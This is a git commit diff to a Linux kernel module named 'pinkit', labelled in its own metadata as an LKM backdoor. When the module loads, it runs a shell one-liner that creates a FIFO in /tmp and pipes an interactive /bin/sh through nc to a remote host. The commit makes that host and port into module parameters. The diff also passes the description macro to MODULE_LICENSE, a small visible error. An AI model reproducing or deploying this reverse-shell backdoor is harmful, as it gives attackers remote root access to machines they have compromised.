fb5e8f11a988da8f2fa8e09727b36268c318dc60
Pinky <36157015+PinkP4nther@users.noreply.github.com>
2018-05-19 20:12:25 +0000

    Add files via upload

--- pinkit.c
+++ pinkit.c
@@ -2,11 +2,36 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/moduleparam.h>
+#include <linux/stat.h>
+
+#define ML	"GPL"
+#define MA	"@Pink_P4nther"
+#define MD	"An LKM Backdoor"
+#define MV	"1.2"
+
+static char *host = "REV_TCP_LH=127.0.0.1";
+module_param(host, charp, 0000);
+static char *port = "REV_TCP_LP=1337";
+module_param(port, charp, 0000);
 
 static int __init mload(void)
 {
-	char *envp[] = {"HOME=/root","TERM=xterm",NULL};
-	char *argv[] = {"/bin/bash","-c","/usr/bin/rm /tmp/pinkit;/usr/bin/mkfifo /tmp/pinkit;/usr/bin/cat /tmp/pinkit|/bin/sh -i 2>&1|/usr/bin/nc 127.0.0.1 1337 >/tmp/pinkit",NULL};
+	char *envp[] = {
+				"HOME=/root",
+				"TERM=xterm",
+				host,
+				port,
+				NULL
+			};
+
+	char *argv[] = {
+				"/bin/bash",
+				"-c",
+				"/usr/bin/rm /tmp/pinkit;/usr/bin/mkfifo /tmp/pinkit;/usr/bin/cat /tmp/pinkit|/bin/sh -i 2>&1|/usr/bin/nc $REV_TCP_LH $REV_TCP_LP >/tmp/pinkit",
+				NULL
+			};
+
 	printk(KERN_INFO "[+] Command Execution Begin\n");
 	call_usermodehelper(argv[0],argv,envp,UMH_WAIT_EXEC);
 	printk(KERN_INFO "[+] Command Execution End\n");
@@ -21,7 +46,7 @@ static void __exit munload(void)
 module_init(mload);
 module_exit(munload);
 
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("@Pink_P4nther");
-MODULE_DESCRIPTION("An LKM backdoor");
-MODULE_VERSION("1.0");
+MODULE_LICENSE(MD);
+MODULE_AUTHOR(MA);
+MODULE_DESCRIPTION(MD);
+MODULE_VERSION(MV);
